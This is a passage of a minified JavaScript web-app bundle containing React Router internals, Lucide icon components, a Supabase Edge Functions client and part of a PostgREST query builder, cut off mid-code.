j.createElement(j.Fragment,null,j.createElement("h2",null,"Unexpected Application Error!"),j.createElement("h3",{style:{fontStyle:"italic"}},r),n?j.createElement("pre",{style:c},n):null,null)}const _0=j.createElement(k0,null);class N0 extends j.Component{constructor(r){super(r),this.state={location:r.location,revalidation:r.revalidation,error:r.error}}static getDerivedStateFromError(r){return{error:r}}static getDerivedStateFromProps(r,n){return n.location!==r.location||n.revalidation!=="idle"&&r.revalidation==="idle"?{error:r.error,location:r.location,revalidation:r.revalidation}:{error:r.error!==void 0?r.error:n.error,location:n.location,revalidation:r.revalidation||n.revalidation}}componentDidCatch(r,n){console.error("React Router caught the following error during render",r,n)}render(){return this.state.error!==void 0?j.createElement(is.Provider,{value:this.props.routeContext},j.createElement(bf.Provider,{value:this.state.error,children:this.props.component})):this.props.children}}function S0(a){let{routeContext:r,match:n,children:l}=a,c=j.useContext(vl);return c&&c.static&&c.staticContext&&(n.route.errorElement||n.route.ErrorBoundary)&&(c.staticContext._deepestRenderedBoundaryId=n.route.id),j.createElement(is.Provider,{value:r},l)}function E0(a,r,n,l){var c;if(r===void 0&&(r=[]),n===void 0&&(n=null),l===void 0&&(l=null),a==null){var u;if(!n)return null;if(n.errors)a=n.matches;else if((u=l)!=null&&u.v7_partialHydration&&r.length===0&&!n.initialized&&n.matches.length>0)a=n.matches;else return null}let h=a,m=(c=n)==null?void 0:c.errors;if(m!=null){let v=h.findIndex(k=>k.route.id&&m?.[k.route.id]!==void 0);v>=0||Ze(!1),h=h.slice(0,Math.min(h.length,v+1))}let x=!1,y=-1;if(n&&l&&l.v7_partialHydration)for(let v=0;v<h.length;v++){let k=h[v];if((k.route.HydrateFallback||k.route.hydrateFallbackElement)&&(y=v),k.route.id){let{loaderData:_,errors:S}=n,w=k.route.loader&&_[k.route.id]===void 0&&(!S||S[k.route.id]===void 0);if(k.route.lazy||w){x=!0,y>=0?h=h.slice(0,y+1):h=[h[0]];break}}}return h.reduceRight((v,k,_)=>{let S,w=!1,E=null,T=null;n&&(S=m&&k.route.id?m[k.route.id]:void 0,E=k.route.errorElement||_0,x&&(y<0&&_===0?(O0("route-fallback"),w=!0,T=null):y===_&&(w=!0,T=k.route.hydrateFallbackElement||null)));let D=r.concat(h.slice(0,_+1)),z=()=>{let I;return S?I=E:w?I=T:k.route.Component?I=j.createElement(k.route.Component,null):k.route.element?I=k.route.element:I=v,j.createElement(S0,{match:k,routeContext:{outlet:v,matches:D,isDataRoute:n!=null},children:I})};return n&&(k.route.ErrorBoundary||k.route.errorElement||_===0)?j.createElement(N0,{location:n.location,revalidation:n.revalidation,component:E,error:S,children:z(),routeContext:{outlet:null,matches:D,isDataRoute:!0}}):z()},null)}var kf=(function(a){return a.UseBlocker="useBlocker",a.UseRevalidator="useRevalidator",a.UseNavigateStable="useNavigate",a})(kf||{}),_f=(function(a){return a.UseBlocker="useBlocker",a.UseLoaderData="useLoaderData",a.UseActionData="useActionData",a.UseRouteError="useRouteError",a.UseNavigation="useNavigation",a.UseRouteLoaderData="useRouteLoaderData",a.UseMatches="useMatches",a.UseRevalidator="useRevalidator",a.UseNavigateStable="useNavigate",a.UseRouteId="useRouteId",a})(_f||{});function C0(a){let r=j.useContext(vl);return r||Ze(!1),r}function T0(a){let r=j.useContext(wf);return r||Ze(!1),r}function R0(a){let r=j.useContext(is);return r||Ze(!1),r}function Nf(a){let r=R0(),n=r.matches[r.matches.length-1];return n.route.id||Ze(!1),n.route.id}function P0(){var a;let r=j.useContext(bf),n=T0(),l=Nf();return r!==void 0?r:(a=n.errors)==null?void 0:a[l]}function A0(){let{router:a}=C0(kf.UseNavigateStable),r=Nf(_f.UseNavigateStable),n=j.useRef(!1);return jf(()=>{n.current=!0}),j.useCallback(function(c,u){u===void 0&&(u={}),n.current&&(typeof c=="number"?a.navigate(c):a.navigate(c,Ma({fromRouteId:r},u)))},[a,r])}const Uh={};function O0(a,r,n){Uh[a]||(Uh[a]=!0)}function I0(a,r){a?.v7_startTransition,a?.v7_relativeSplatPath}function qc(a){let{to:r,replace:n,state:l,relative:c}=a;Gn()||Ze(!1);let{future:u,static:h}=j.useContext(as),{matches:m}=j.useContext(is),{pathname:x}=an(),y=ur(),v=Wc(r,Bc(m,u.v7_relativeSplatPath),x,c==="path"),k=JSON.stringify(v);return j.useEffect(()=>y(JSON.parse(k),{replace:n,state:l,relative:c}),[y,k,c,n,l]),null}function Mt(a){Ze(!1)}function $0(a){let{basename:r="/",children:n=null,location:l,navigationType:c=As.Pop,navigator:u,static:h=!1,future:m}=a;Gn()&&Ze(!1);let x=r.replace(/^\/*/,"/"),y=j.useMemo(()=>({basename:x,navigator:u,static:h,future:Ma({v7_relativeSplatPath:!1},m)}),[x,m,u,h]);typeof l=="string"&&(l=Kn(l));let{pathname:v="/",search:k="",hash:_="",state:S=null,key:w="default"}=l,E=j.useMemo(()=>{let T=qn(v,x);return T==null?null:{location:{pathname:T,search:k,hash:_,state:S,key:w},navigationType:c}},[x,v,k,_,S,w,c]);return E==null?null:j.createElement(as.Provider,{value:y},j.createElement(wl.Provider,{children:n,value:E}))}function D0(a){let{children:r,location:n}=a;return b0(kc(r),n)}new Promise(()=>{});function kc(a,r){r===void 0&&(r=[]);let n=[];return j.Children.forEach(a,(l,c)=>{if(!j.isValidElement(l))return;let u=[...r,c];if(l.type===j.Fragment){n.push.apply(n,kc(l.props.children,u));return}l.type!==Mt&&Ze(!1),!l.props.index||!l.props.children||Ze(!1);let h={id:l.props.id||u.join("-"),caseSensitive:l.props.caseSensitive,element:l.props.element,Component:l.props.Component,index:l.props.index,path:l.props.path,loader:l.props.loader,action:l.props.action,errorElement:l.props.errorElement,ErrorBoundary:l.props.ErrorBoundary,hasErrorBoundary:l.props.ErrorBoundary!=null||l.props.errorElement!=null,shouldRevalidate:l.props.shouldRevalidate,handle:l.props.handle,lazy:l.props.lazy};l.props.children&&(h.children=kc(l.props.children,u)),n.push(h)}),n}function hl(){return hl=Object.assign?Object.assign.bind():function(a){for(var r=1;r<arguments.length;r++){var n=arguments[r];for(var l in n)Object.prototype.hasOwnProperty.call(n,l)&&(a[l]=n[l])}return a},hl.apply(this,arguments)}function Sf(a,r){if(a==null)return{};var n={},l=Object.keys(a),c,u;for(u=0;u<l.length;u++)c=l[u],!(r.indexOf(c)>=0)&&(n[c]=a[c]);return n}function z0(a){return!!(a.metaKey||a.altKey||a.ctrlKey||a.shiftKey)}function U0(a,r){return a.button===0&&(!r||r==="_self")&&!z0(a)}const L0=["onClick","relative","reloadDocument","replace","state","target","to","preventScrollReset","viewTransition"],M0=["aria-current","caseSensitive","className","end","style","to","viewTransition","children"],F0="6";try{window.__reactRouterVersion=F0}catch{}const B0=j.createContext({isTransitioning:!1}),W0="startTransition",Lh=Lm[W0];function q0(a){let{basename:r,children:n,future:l,window:c}=a,u=j.useRef();u.current==null&&(u.current=Hm({window:c,v5Compat:!0}));let h=u.current,[m,x]=j.useState({action:h.action,location:h.location}),{v7_startTransition:y}=l||{},v=j.useCallback(k=>{y&&Lh?Lh(()=>x(k)):x(k)},[x,y]);return j.useLayoutEffect(()=>h.listen(v),[h,v]),j.useEffect(()=>I0(l),[l]),j.createElement($0,{basename:r,children:n,location:m.location,navigationType:m.action,navigator:h,future:l})}const V0=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u",H0=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,K0=j.forwardRef(function(r,n){let{onClick:l,relative:c,reloadDocument:u,replace:h,state:m,target:x,to:y,preventScrollReset:v,viewTransition:k}=r,_=Sf(r,L0),{basename:S}=j.useContext(as),w,E=!1;if(typeof y=="string"&&H0.test(y)&&(w=y,V0))try{let I=new URL(window.location.href),H=y.startsWith("//")?new URL(I.protocol+y):new URL(y),te=qn(H.pathname,S);H.origin===I.origin&&te!=null?y=te+H.search+H.hash:E=!0}catch{}let T=y0(y,{relative:c}),D=J0(y,{replace:h,state:m,target:x,preventScrollReset:v,relative:c,viewTransition:k});function z(I){l&&l(I),I.defaultPrevented||D(I)}return j.createElement("a",hl({},_,{href:w||T,onClick:E||u?l:z,ref:n,target:x}))}),Mh=j.forwardRef(function(r,n){let{"aria-current":l="page",caseSensitive:c=!1,className:u="",end:h=!1,style:m,to:x,viewTransition:y,children:v}=r,k=Sf(r,M0),_=bl(x,{relative:k.relative}),S=an(),w=j.useContext(wf),{navigator:E,basename:T}=j.useContext(as),D=w!=null&&Y0(_)&&y===!0,z=E.encodeLocation?E.encodeLocation(_).pathname:_.pathname,I=S.pathname,H=w&&w.navigation&&w.navigation.location?w.navigation.location.pathname:null;c||(I=I.toLowerCase(),H=H?H.toLowerCase():null,z=z.toLowerCase()),H&&T&&(H=qn(H,T)||H);const te=z!=="/"&&z.endsWith("/")?z.length-1:z.length;let J=I===z||!h&&I.startsWith(z)&&I.charAt(te)==="/",F=H!=null&&(H===z||!h&&H.startsWith(z)&&H.charAt(z.length)==="/"),ne={isActive:J,isPending:F,isTransitioning:D},ue=J?l:void 0,Ee;typeof u=="function"?Ee=u(ne):Ee=[u,J?"active":null,F?"pending":null,D?"transitioning":null].filter(Boolean).join(" ");let ze=typeof m=="function"?m(ne):m;return j.createElement(K0,hl({},k,{"aria-current":ue,className:Ee,ref:n,style:ze,to:x,viewTransition:y}),typeof v=="function"?v(ne):v)});var _c;(function(a){a.UseScrollRestoration="useScrollRestoration",a.UseSubmit="useSubmit",a.UseSubmitFetcher="useSubmitFetcher",a.UseFetcher="useFetcher",a.useViewTransitionState="useViewTransitionState"})(_c||(_c={}));var Fh;(function(a){a.UseFetcher="useFetcher",a.UseFetchers="useFetchers",a.UseScrollRestoration="useScrollRestoration"})(Fh||(Fh={}));function G0(a){let r=j.useContext(vl);return r||Ze(!1),r}function J0(a,r){let{target:n,replace:l,state:c,preventScrollReset:u,relative:h,viewTransition:m}=r===void 0?{}:r,x=ur(),y=an(),v=bl(a,{relative:h});return j.useCallback(k=>{if(U0(k,n)){k.preventDefault();let _=l!==void 0?l:dl(y)===dl(v);x(a,{replace:_,state:c,preventScrollReset:u,relative:h,viewTransition:m})}},[y,x,v,l,c,n,a,u,h,m])}function Y0(a,r){r===void 0&&(r={});let n=j.useContext(B0);n==null&&Ze(!1);let{basename:l}=G0(_c.useViewTransitionState),c=bl(a,{relative:r.relative});if(!n.isTransitioning)return!1;let u=qn(n.currentLocation.pathname,l)||n.currentLocation.pathname,h=qn(n.nextLocation.pathname,l)||n.nextLocation.pathname;return jc(c.pathname,h)!=null||jc(c.pathname,u)!=null}var Q0={xmlns:"http://www.w3.org/2000/svg",width:24,height:24,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:2,strokeLinecap:"round",strokeLinejoin:"round"};const X0=a=>a.replace(/([a-z0-9])([A-Z])/g,"$1-$2").toLowerCase().trim(),Se=(a,r)=>{const n=j.forwardRef(({color:l="currentColor",size:c=24,strokeWidth:u=2,absoluteStrokeWidth:h,className:m="",children:x,...y},v)=>j.createElement("svg",{ref:v,...Q0,width:c,height:c,stroke:l,strokeWidth:h?Number(u)*24/Number(c):u,className:["lucide",`lucide-${X0(a)}`,m].join(" "),...y},[...r.map(([k,_])=>j.createElement(k,_)),...Array.isArray(x)?x:[x]]));return n.displayName=`${a}`,n};const Bh=Se("Activity",[["path",{d:"M22 12h-4l-3 9L9 3l-3 9H2",key:"d5dnw9"}]]);const at=Se("AlertCircle",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["line",{x1:"12",x2:"12",y1:"8",y2:"12",key:"1pkeuh"}],["line",{x1:"12",x2:"12.01",y1:"16",y2:"16",key:"4dfq90"}]]);const Z0=Se("AlertTriangle",[["path",{d:"m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z",key:"c3ski4"}],["path",{d:"M12 9v4",key:"juzpu7"}],["path",{d:"M12 17h.01",key:"p32p05"}]]);const fl=Se("ArrowLeft",[["path",{d:"m12 19-7-7 7-7",key:"1l729n"}],["path",{d:"M19 12H5",key:"x3x0zl"}]]);const Vc=Se("ArrowRight",[["path",{d:"M5 12h14",key:"1ays0h"}],["path",{d:"m12 5 7 7-7 7",key:"xquz4c"}]]);const ex=Se("ArrowUpRight",[["path",{d:"M7 7h10v10",key:"1tivn9"}],["path",{d:"M7 17 17 7",key:"1vkiza"}]]);const Nc=Se("Bell",[["path",{d:"M6 8a6 6 0 0 1 12 0c0 7 3 9 3 9H3s3-2 3-9",key:"1qo2s2"}],["path",{d:"M10.3 21a1.94 1.94 0 0 0 3.4 0",key:"qgo35s"}]]);const rs=Se("CheckCircle2",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"m9 12 2 2 4-4",key:"dzmm74"}]]);const tx=Se("CheckCircle",[["path",{d:"M22 11.08V12a10 10 0 1 1-5.93-9.14",key:"g774vq"}],["path",{d:"m9 11 3 3L22 4",key:"1pflzl"}]]);const jt=Se("Check",[["path",{d:"M20 6 9 17l-5-5",key:"1gmf2c"}]]);const cr=Se("ChevronDown",[["path",{d:"m6 9 6 6 6-6",key:"qrunsl"}]]);const Fr=Se("Clock",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["polyline",{points:"12 6 12 12 16 14",key:"68esgv"}]]);const jl=Se("CreditCard",[["rect",{width:"20",height:"14",x:"2",y:"5",rx:"2",key:"ynyp8z"}],["line",{x1:"2",x2:"22",y1:"10",y2:"10",key:"1b3vmo"}]]);const Os=Se("DollarSign",[["line",{x1:"12",x2:"12",y1:"2",y2:"22",key:"7eqyqh"}],["path",{d:"M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6",key:"1b0p4s"}]]);const Fa=Se("ExternalLink",[["path",{d:"M15 3h6v6",key:"1q9fwt"}],["path",{d:"M10 14 21 3",key:"gplh6r"}],["path",{d:"M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6",key:"a6xqqp"}]]);const Ef=Se("EyeOff",[["path",{d:"M9.88 9.88a3 3 0 1 0 4.24 4.24",key:"1jxqfv"}],["path",{d:"M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68",key:"9wicm4"}],["path",{d:"M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61",key:"1jreej"}],["line",{x1:"2",x2:"22",y1:"2",y2:"22",key:"a6p6uj"}]]);const Hc=Se("Eye",[["path",{d:"M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z",key:"rwhkz3"}],["circle",{cx:"12",cy:"12",r:"3",key:"1v7zrd"}]]);const rx=Se("FileText",[["path",{d:"M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z",key:"1rqfz7"}],["path",{d:"M14 2v4a2 2 0 0 0 2 2h4",key:"tnqrlb"}],["path",{d:"M10 9H8",key:"b1mrlr"}],["path",{d:"M16 13H8",key:"t4e002"}],["path",{d:"M16 17H8",key:"z1uh3a"}]]);const pl=Se("Globe",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20",key:"13o1zl"}],["path",{d:"M2 12h20",key:"9i4pu4"}]]);const sx=Se("History",[["path",{d:"M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8",key:"1357e3"}],["path",{d:"M3 3v5h5",key:"1xhq8a"}],["path",{d:"M12 7v5l4 2",key:"1fdv2h"}]]);const nx=Se("Home",[["path",{d:"m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z",key:"y5dka4"}],["polyline",{points:"9 22 9 12 15 12 15 22",key:"e2us08"}]]);const Cf=Se("Inbox",[["polyline",{points:"22 12 16 12 14 15 10 15 8 12 2 12",key:"o97t9d"}],["path",{d:"M5.45 5.11 2 12v6a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-6l-3.45-6.89A2 2 0 0 0 16.76 4H7.24a2 2 0 0 0-1.79 1.11z",key:"oot6mr"}]]);const ax=Se("Layers",[["path",{d:"m12.83 2.18a2 2 0 0 0-1.66 0L2.6 6.08a1 1 0 0 0 0 1.83l8.58 3.91a2 2 0 0 0 1.66 0l8.58-3.9a1 1 0 0 0 0-1.83Z",key:"8b97xw"}],["path",{d:"m22 17.65-9.17 4.16a2 2 0 0 1-1.66 0L2 17.65",key:"dd6zsq"}],["path",{d:"m22 12.65-9.17 4.16a2 2 0 0 1-1.66 0L2 12.65",key:"ep9fru"}]]);const ul=Se("Link2",[["path",{d:"M9 17H7A5 5 0 0 1 7 7h2",key:"8i5ue5"}],["path",{d:"M15 7h2a5 5 0 1 1 0 10h-2",key:"1b9ql8"}],["line",{x1:"8",x2:"16",y1:"12",y2:"12",key:"1jonct"}]]);const ix=Se("ListTodo",[["rect",{x:"3",y:"5",width:"6",height:"6",rx:"1",key:"1defrl"}],["path",{d:"m3 17 2 2 4-4",key:"1jhpwq"}],["path",{d:"M13 6h8",key:"15sg57"}],["path",{d:"M13 12h8",key:"h98zly"}],["path",{d:"M13 18h8",key:"oe0vm4"}]]);const Nr=Se("Lock",[["rect",{width:"18",height:"11",x:"3",y:"11",rx:"2",ry:"2",key:"1w4ew1"}],["path",{d:"M7 11V7a5 5 0 0 1 10 0v4",key:"fwvmzm"}]]);const Tf=Se("LogOut",[["path",{d:"M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4",key:"1uf3rs"}],["polyline",{points:"16 17 21 12 16 7",key:"1gabdz"}],["line",{x1:"21",x2:"9",y1:"12",y2:"12",key:"1uyos4"}]]);const Rf=Se("Mail",[["rect",{width:"20",height:"16",x:"2",y:"4",rx:"2",key:"18n3k1"}],["path",{d:"m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7",key:"1ocrg3"}]]);const lx=Se("Menu",[["line",{x1:"4",x2:"20",y1:"12",y2:"12",key:"1e0a9i"}],["line",{x1:"4",x2:"20",y1:"6",y2:"6",key:"1owob3"}],["line",{x1:"4",x2:"20",y1:"18",y2:"18",key:"yk5zj1"}]]);const Er=Se("MessageSquare",[["path",{d:"M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z",key:"1lielz"}]]);const Kc=Se("Pen",[["path",{d:"M17 3a2.85 2.83 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5Z",key:"5qss01"}]]);const ml=Se("Plus",[["path",{d:"M5 12h14",key:"1ays0h"}],["path",{d:"M12 5v14",key:"s699le"}]]);const ox=Se("Scale",[["path",{d:"m16 16 3-8 3 8c-.87.65-1.92 1-3 1s-2.13-.35-3-1Z",key:"7g6ntu"}],["path",{d:"m2 16 3-8 3 8c-.87.65-1.92 1-3 1s-2.13-.35-3-1Z",key:"ijws7r"}],["path",{d:"M7 21h10",key:"1b0cd5"}],["path",{d:"M12 3v18",key:"108xh3"}],["path",{d:"M3 7h2c2 0 5-1 7-2 2 1 5 2 7 2h2",key:"3gwbw2"}]]);const Gc=Se("Search",[["circle",{cx:"11",cy:"11",r:"8",key:"4ej97u"}],["path",{d:"m21 21-4.3-4.3",key:"1qie3q"}]]);const Vn=Se("Send",[["path",{d:"m22 2-7 20-4-9-9-4Z",key:"1q3vgg"}],["path",{d:"M22 2 11 13",key:"nzbqef"}]]);const Wh=Se("Settings",[["path",{d:"M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-1-1.74v-.5a2 2 0 0 1 1-1.74l.15-.09a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z",key:"1qme2f"}],["circle",{cx:"12",cy:"12",r:"3",key:"1v7zrd"}]]);const Sc=Se("ShieldCheck",[["path",{d:"M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z",key:"oel41y"}],["path",{d:"m9 12 2 2 4-4",key:"dzmm74"}]]);const Ds=Se("Shield",[["path",{d:"M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z",key:"oel41y"}]]);const Pf=Se("Tag",[["path",{d:"M12.586 2.586A2 2 0 0 0 11.172 2H4a2 2 0 0 0-2 2v7.172a2 2 0 0 0 .586 1.414l8.704 8.704a2.426 2.426 0 0 0 3.42 0l6.58-6.58a2.426 2.426 0 0 0 0-3.42z",key:"vktsd0"}],["circle",{cx:"7.5",cy:"7.5",r:".5",fill:"currentColor",key:"kqv944"}]]);const $s=Se("Trash2",[["path",{d:"M3 6h18",key:"d0wm0j"}],["path",{d:"M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6",key:"4alrt4"}],["path",{d:"M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2",key:"v07s0e"}],["line",{x1:"10",x2:"10",y1:"11",y2:"17",key:"1uufr5"}],["line",{x1:"14",x2:"14",y1:"11",y2:"17",key:"xtxkd"}]]);const ss=Se("User",[["path",{d:"M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2",key:"975kel"}],["circle",{cx:"12",cy:"7",r:"4",key:"17ys0d"}]]);const Jc=Se("Users",[["path",{d:"M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2",key:"1yyitq"}],["circle",{cx:"9",cy:"7",r:"4",key:"nufk8"}],["path",{d:"M22 21v-2a4 4 0 0 0-3-3.87",key:"kshegd"}],["path",{d:"M16 3.13a4 4 0 0 1 0 7.75",key:"1da9ce"}]]);const cx=Se("WalletCards",[["rect",{width:"18",height:"18",x:"3",y:"3",rx:"2",key:"afitv7"}],["path",{d:"M3 9a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2",key:"4125el"}],["path",{d:"M3 11h3c.8 0 1.6.3 2.1.9l1.1.9c1.6 1.6 4.1 1.6 5.7 0l1.1-.9c.5-.5 1.3-.9 2.1-.9H21",key:"1dpki6"}]]);const Hn=Se("Wallet",[["path",{d:"M21 12V7H5a2 2 0 0 1 0-4h14v4",key:"195gfw"}],["path",{d:"M3 5v14a2 2 0 0 0 2 2h16v-5",key:"195n9w"}],["path",{d:"M18 12a2 2 0 0 0 0 4h4v-4Z",key:"vllfpd"}]]);const De=Se("X",[["path",{d:"M18 6 6 18",key:"1bl5f8"}],["path",{d:"m6 6 12 12",key:"d8bk6v"}]]);const ux=Se("Zap",[["polygon",{points:"13 2 3 14 12 14 11 22 21 10 12 10 13 2",key:"45s27k"}]]);function kl(a,r){var n={};for(var l in a)Object.prototype.hasOwnProperty.call(a,l)&&r.indexOf(l)<0&&(n[l]=a[l]);if(a!=null&&typeof Object.getOwnPropertySymbols=="function")for(var c=0,l=Object.getOwnPropertySymbols(a);c<l.length;c++)r.indexOf(l[c])<0&&Object.prototype.propertyIsEnumerable.call(a,l[c])&&(n[l[c]]=a[l[c]]);return n}function dx(a,r,n,l){function c(u){return u instanceof n?u:new n(function(h){h(u)})}return new(n||(n=Promise))(function(u,h){function m(v){try{y(l.next(v))}catch(k){h(k)}}function x(v){try{y(l.throw(v))}catch(k){h(k)}}function y(v){v.done?u(v.value):c(v.value).then(m,x)}y((l=l.apply(a,r||[])).next())})}const hx=a=>a?(...r)=>a(...r):(...r)=>fetch(...r);class Yc extends Error{constructor(r,n="FunctionsError",l){super(r),this.name=n,this.context=l}}class fx extends Yc{constructor(r){super("Failed to send a request to the Edge Function","FunctionsFetchError",r)}}class qh extends Yc{constructor(r){super("Relay Error invoking the Edge Function","FunctionsRelayError",r)}}class Vh extends Yc{constructor(r){super("Edge Function returned a non-2xx status code","FunctionsHttpError",r)}}var Ec;(function(a){a.Any="any",a.ApNortheast1="ap-northeast-1",a.ApNortheast2="ap-northeast-2",a.ApSouth1="ap-south-1",a.ApSoutheast1="ap-southeast-1",a.ApSoutheast2="ap-southeast-2",a.CaCentral1="ca-central-1",a.EuCentral1="eu-central-1",a.EuWest1="eu-west-1",a.EuWest2="eu-west-2",a.EuWest3="eu-west-3",a.SaEast1="sa-east-1",a.UsEast1="us-east-1",a.UsWest1="us-west-1",a.UsWest2="us-west-2"})(Ec||(Ec={}));class px{constructor(r,{headers:n={},customFetch:l,region:c=Ec.Any}={}){this.url=r,this.headers=n,this.region=c,this.fetch=hx(l)}setAuth(r){this.headers.Authorization=`Bearer ${r}`}invoke(r){return dx(this,arguments,void 0,function*(n,l={}){var c;let u,h;try{const{headers:m,method:x,body:y,signal:v,timeout:k}=l;let _={},{region:S}=l;S||(S=this.region);const w=new URL(`${this.url}/${n}`);S&&S!=="any"&&(_["x-region"]=S,w.searchParams.set("forceFunctionRegion",S));let E;y&&(m&&!Object.prototype.hasOwnProperty.call(m,"Content-Type")||!m)?typeof Blob<"u"&&y instanceof Blob||y instanceof ArrayBuffer?(_["Content-Type"]="application/octet-stream",E=y):typeof y=="string"?(_["Content-Type"]="text/plain",E=y):typeof FormData<"u"&&y instanceof FormData?E=y:(_["Content-Type"]="application/json",E=JSON.stringify(y)):y&&typeof y!="string"&&!(typeof Blob<"u"&&y instanceof Blob)&&!(y instanceof ArrayBuffer)&&!(typeof FormData<"u"&&y instanceof FormData)?E=JSON.stringify(y):E=y;let T=v;k&&(h=new AbortController,u=setTimeout(()=>h.abort(),k),v?(T=h.signal,v.addEventListener("abort",()=>h.abort())):T=h.signal);const D=yield this.fetch(w.toString(),{method:x||"POST",headers:Object.assign(Object.assign(Object.assign({},_),this.headers),m),body:E,signal:T}).catch(te=>{throw new fx(te)}),z=D.headers.get("x-relay-error");if(z&&z==="true")throw new qh(D);if(!D.ok)throw new Vh(D);let I=((c=D.headers.get("Content-Type"))!==null&&c!==void 0?c:"text/plain").split(";")[0].trim(),H;return I==="application/json"?H=yield D.json():I==="application/octet-stream"||I==="application/pdf"?H=yield D.blob():I==="text/event-stream"?H=D:I==="multipart/form-data"?H=yield D.formData():H=yield D.text(),{data:H,error:null,response:D}}catch(m){return{data:null,error:m,response:m instanceof Vh||m instanceof qh?m.context:void 0}}finally{u&&clearTimeout(u)}})}}var mx=class extends Error{constructor(a){super(a.message),this.name="PostgrestError",this.details=a.details,this.hint=a.hint,this.code=a.code}},xx=class{constructor(a){var r,n;this.shouldThrowOnError=!1,this.method=a.method,this.url=a.url,this.headers=new Headers(a.headers),this.schema=a.schema,this.body=a.body,this.shouldThrowOnError=(r=a.shouldThrowOnError)!==null&&r!==void 0?r:!1,this.signal=a.signal,this.isMaybeSingle=(n=a.isMaybeSingle)!==null&&n!==void 0?n:!1,a.fetch?this.fetch=a.fetch:this.fetch=fetch}throwOnError(){return this.shouldThrowOnError=!0,this}setHeader(a,r){return this.headers=new Headers(this.headers),this.headers.set(a,r),this}then(a,r){var n=this;this.schema===void 0||(["GET","HEAD"].includes(this.method)?this.headers.set("Accept-Profile",this.schema):this.headers.set("Content-Profile",this.schema)),this.method!=="GET"&&this.method!=="HEAD"&&this.headers.set("Content-Type","application/json");const l=this.fetch;let c=l(this.url.toString(),{method:this.method,headers:this.headers,body:JSON.stringify(this.body),signal:this.signal}).then(async u=>{let h=null,m=null,x=null,y=u.status,v=u.statusText;if(u.ok){var k,_;if(n.method!=="HEAD"){var S;const D=await u.text();D===""||(n.headers.get("Accept")==="text/csv"||n.headers.get("Accept")&&(!((S=n.headers.get("Accept"))===null||S===void 0)&&S.includes("application/vnd.pgrst.plan+text"))?m=D:m=JSON.parse(D))}const E=(k=n.headers.get("Prefer"))===null||k===void 0?void 0:k.match(/count=(exact|planned|estimated)/),T=(_=u.headers.get("content-range"))===null||_===void 0?void 0:_.split("/");E&&T&&T.length>1&&(x=parseInt(T[1])),n.isMaybeSingle&&n.method==="GET"&&Array.isArray(m)&&(m.length>1?(h={code:"PGRST116",details:`Results contain ${m.length} rows, application/vnd.pgrst.object+json requires 1 row`,hint:null,message:"JSON object requested, multiple (or no) rows returned"},m=null,x=null,y=406,v="Not Acceptable"):m.length===1?m=m[0]:m=null)}else{var w;const E=await u.text();try{h=JSON.parse(E),Array.isArray(h)&&u.status===404&&(m=[],h=null,y=200,v="OK")}catch{u.status===404&&E===""?(y=204,v="No Content"):h={message:E}}if(h&&n.isMaybeSingle&&(!(h==null||(w=h.details)===null||w===void 0)&&w.includes("0 rows"))&&(h=null,y=200,v="OK"),h&&n.shouldThrowOnError)throw new mx(h)}return{error:h,data:m,count:x,status:y,statusText:v}});return this.shouldThrowOnError||(c=c.catch(u=>{var h;let 